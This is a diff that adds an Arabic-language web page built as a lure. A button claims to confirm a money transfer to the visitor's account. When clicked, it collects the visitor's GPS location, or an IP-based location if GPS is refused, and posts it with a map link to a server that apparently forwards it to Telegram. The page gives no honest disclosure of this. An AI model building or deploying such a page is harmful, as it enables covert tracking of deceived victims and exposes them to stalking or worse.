@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>اضغط هنا</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 20px;
+      font-weight: bold;
+      background-color: rgba(0, 0, 0, 0.6);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button id="getLocationBtn">اضغط لتأكيد التحويل لحسابك</button>
+
+  <script>
+    async function sendToServer(message) {
+      try {
+        const res = await fetch('/send-location', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({text: message})
+        });
+        const data = await res.json();
+        if(data.ok) alert('تم إرسال الموقع إلى تيليجرام بنجاح.');
+        else alert('حدث خطأ أثناء الإرسال إلى تيليجرام.');
+      } catch(err) {
+        alert('تعذر الإرسال: ' + err.message);
+      }
+    }
+
+    document.getElementById('getLocationBtn').addEventListener('click', () => {
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude } = pos.coords;
+          const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          const message = `📍 موقع جديد:\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nرابط الخريطة: ${googleMapsLink}`;
+          sendToServer(message);
+        }, async () => {
+          // fallback عبر IP
+          try {
+            const res = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
+            const data = await res.json();
+            const loc = data.loc ? data.loc.split(',') : ['غير متاح','غير متاح'];
+            const message = `📍 موقع تقريبي عبر IP:\nمدينة: ${data.city}\nدولة: ${data.country}\nخط العرض: ${loc[0]}\nخط الطول: ${loc[1]}`;
+            sendToServer(message);
+          } catch {
+            alert('تعذر الحصول على الموقع عبر GPS أو IP.');
+          }
+        });
+      } else {
+        alert('متصفحك لا يدعم تحديد الموقع.');
+      }
+    });
+  </script>
+</body>
+</html>
